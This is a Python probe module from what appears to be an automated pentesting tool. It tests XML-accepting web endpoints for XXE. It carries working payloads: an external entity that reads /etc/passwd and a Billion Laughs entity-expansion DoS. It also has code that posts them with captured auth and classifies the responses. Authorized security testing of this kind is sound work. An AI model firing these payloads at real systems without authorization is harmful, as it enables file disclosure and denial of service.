"""XXE (XML External Entity) probe.

Two-step probe targeting endpoints that accept XML. Sends a benign
XML baseline first, then a malicious payload with an external entity.
Each candidate path is tried with BOTH request shapes:

- `multipart/form-data` with a `file` field (Juice-Shop-style uploaders)
- `application/xml` raw body (modern REST endpoints that read the raw
  request body and feed it to `etree.fromstring` / similar)

Four failure modes count:

1. Body discloses Linux /etc/passwd content (root:x:0:) -> CRITICAL.
2. Body discloses Windows system.ini ([boot loader] / [Mail]) -> CRITICAL.
3. Response time delta >= 5 seconds vs baseline -> HIGH.
   Billion Laughs / entity-expansion DoS.
4. HTTP 500 with body containing both "DOCTYPE" and "entity" markers ->
   MEDIUM. XML parser is reachable, deeper probing warranted.

Carries `ctx.captured_auth` via `auth_headers()` so cookie/bearer-gated
import endpoints (e.g. POST /api/import behind a login) get reached
before any 401 short-circuit.
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Any, Literal

import aiohttp

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers

logger = logging.getLogger("pentest-ai.probes.web.xxe_upload")

_USER_AGENT = "pentest-ai/0.11 (+https://pentestai.xyz)"
_BODY_TRUNCATE = 65000
_DEFAULT_TIMEOUT_S = 10.0
_DOS_TIMEOUT_S = 12.0

ALWAYS_PROBED: tuple[str, ...] = (
    "/file-upload",
    "/api/Complaints",
    "/rest/admin/upload",
    "/api/upload",
    "/upload",
    "/api/import",
    "/import",
    "/api/xml",
    "/api/parse",
)

BASELINE_XML = b'<?xml version="1.0"?><foo>baseline</foo>'

XXE_PASSWD_PAYLOAD = (
    b'<?xml version="1.0" encoding="ISO-8859-1"?>\n'
    b"<!DOCTYPE foo [\n"
    b"<!ELEMENT foo ANY>\n"
    b'<!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    b"]>\n"
    b"<foo>&xxe;</foo>\n"
)

# Billion Laughs entity expansion. Each &lol9; expands to 10^9 'lol' tokens.
XXE_DOS_PAYLOAD = (
    b'<?xml version="1.0"?>\n'
    b"<!DOCTYPE lolz [\n"
    b'<!ENTITY lol "lol">\n'
    b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
    b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
    b'<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n'
    b'<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n'
    b"]>\n"
    b"<lolz>&lol5;</lolz>\n"
)

_DOS_DELTA_S = 5.0
_BOUNDARY = "----ptaiXXEBoundary7MA4YWxkTrZu0gW"


def _build_multipart(xml_bytes: bytes, *, filename: str = "payload.xml") -> bytes:
    """Construct a multipart/form-data body with a single file field 'file'.

    Hand-rolled so we can attach the exact XML bytes verbatim. aiohttp's
    FormData would re-encode; we need byte-perfect control of the entity
    block for XXE to fire.
    """
    crlf = b"\r\n"
    parts = (
        f"--{_BOUNDARY}".encode(),
        b'Content-Disposition: form-data; name="file"; filename="' + filename.encode() + b'"',
        b"Content-Type: application/xml",
        b"",
        xml_bytes,
        f"--{_BOUNDARY}--".encode(),
        b"",
    )
    return crlf.join(parts)


async def _post_xml(
    session: aiohttp.ClientSession,
    url: str,
    xml_bytes: bytes,
    *,
    shape: Literal["multipart", "raw"] = "multipart",
    extra_headers: dict[str, str] | None = None,
    timeout_s: float = _DEFAULT_TIMEOUT_S,
) -> tuple[int, dict[str, str], str, float]:
    """POST an XML payload. Returns (status, headers, body, elapsed_s).

    shape="multipart" wraps the bytes in a hand-rolled multipart/form-data
    body with a `file` field (Juice-Shop-style uploaders). shape="raw"
    sends the bytes verbatim with Content-Type: application/xml (modern
    REST endpoints that XML-parse the request body directly).

    `extra_headers` is merged in last so probe callers can attach captured
    auth (cookies, bearer tokens) via auth_headers().

    On any network error we return a sentinel (0, {}, "", elapsed) so the
    caller can compare against the baseline without try/except sprinkled
    across the probe body.
    """
    if shape == "multipart":
        body = _build_multipart(xml_bytes)
        headers = {
            "User-Agent": _USER_AGENT,
            "Content-Type": f"multipart/form-data; boundary={_BOUNDARY}",
            "Content-Length": str(len(body)),
            "Accept": "*/*",
        }
    else:
        body = xml_bytes
        headers = {
            "User-Agent": _USER_AGENT,
            "Content-Type": "application/xml",
            "Content-Length": str(len(body)),
            "Accept": "*/*",
        }
    if extra_headers:
        headers.update(extra_headers)
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    started = time.monotonic()
    try:
        async with session.post(url, data=body, headers=headers, timeout=timeout) as resp:
            text = await resp.text(errors="replace")
            elapsed = time.monotonic() - started
            return (
                resp.status,
                {k: v for k, v in resp.headers.items()},
                text[:_BODY_TRUNCATE],
                elapsed,
            )
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError) as exc:
        elapsed = time.monotonic() - started
        logger.debug("XML POST %s failed in %.2fs: %s", url, elapsed, exc)
        return 0, {}, "", elapsed


def _classify(
    status: int,
    body: str,
    elapsed: float,
    baseline_elapsed: float,
) -> tuple[str, str, str] | None:
    """Return (severity, variant, detail) if XXE signal present, else None."""
    body_lc = body.lower()

    if "root:x:0:" in body:
        return (
            "critical",
            "file_disclosure_passwd",
            "Linux /etc/passwd disclosed in response (root:x:0: marker).",
        )
    if "[boot loader]" in body_lc or "[mail]" in body_lc:
        return (
            "critical",
            "file_disclosure_systemini",
            "Windows system.ini disclosed in response.",
        )
    if elapsed - baseline_elapsed >= _DOS_DELTA_S:
        return (
            "high",
            "billion_laughs_dos",
            f"Entity expansion DoS: attack {elapsed:.2f}s vs baseline {baseline_elapsed:.2f}s.",
        )
    if status == 500 and "doctype" in body_lc and "entity" in body_lc:
        return (
            "medium",
            "parser_reachable",
            "XML parser reachable; DOCTYPE/entity error surfaced in 500.",
        )
    return None


def _emit(target: str, severity: str, variant: str, detail: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"XXE ({variant}): {detail}",
        "severity": severity,
        "category": "injection",
        "target": target,
        "evidence": evidence[:512],
        "bug_class": "xxe",
        "remediation": (
            "Disable external entity resolution and DOCTYPE processing in the "
            "XML parser. For Java use XMLConstants.FEATURE_SECURE_PROCESSING; "
            "for Python use defusedxml; for libxml2 set XML_PARSE_NOENT off."
        ),
    }


@registry.probe(
    name="web.xxe_upload",
    bug_class="xxe",
    severity_max="critical",
    owasp="A05:2021",
    runtime_budget_s=15.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_xxe_upload(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Three-shot XXE probe across two shapes: baseline, file-disclosure, billion-laughs DoS."""
    candidates = list(dict.fromkeys(
        list(ALWAYS_PROBED) + list(ctx.candidate_endpoints or ())
    ))
    base = ctx.base.rstrip("/")
    extra = auth_headers(ctx.captured_auth)
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        for shape in ("multipart", "raw"):
            # Step 1: baseline
            b_status, _b_headers, _b_body, b_elapsed = await _post_xml(
                ctx.session, url, BASELINE_XML, shape=shape, extra_headers=extra,
            )
            # Skip shape/target combos that flat-out refuse XML without a
            # parse attempt. 404 means endpoint doesn't exist; 0 means
            # transport error. 415 / 401 fall through so the other shape
            # still gets a chance (multipart-only or raw-only servers).
            if b_status in (0, 404):
                continue

            # Step 2: file-disclosure XXE
            a_status, _a_headers, a_body, a_elapsed = await _post_xml(
                ctx.session, url, XXE_PASSWD_PAYLOAD, shape=shape, extra_headers=extra,
            )
            classified = _classify(a_status, a_body, a_elapsed, b_elapsed)
            if classified is not None:
                severity, variant, detail = classified
                key = (url, variant, shape)
                if key not in seen:
                    seen.add(key)
                    findings.append(_emit(url, severity, variant, detail, a_body))
                    if variant.startswith("file_disclosure"):
                        continue

            # Step 3: billion-laughs DoS
            d_status, _d_headers, d_body, d_elapsed = await _post_xml(
                ctx.session, url, XXE_DOS_PAYLOAD,
                shape=shape, extra_headers=extra, timeout_s=_DOS_TIMEOUT_S,
            )
            classified_dos = _classify(d_status, d_body, d_elapsed, b_elapsed)
            if classified_dos is not None:
                severity, variant, detail = classified_dos
                key = (url, variant, shape)
                if key not in seen:
                    seen.add(key)
                    findings.append(_emit(url, severity, variant, detail, d_body))

    return findings
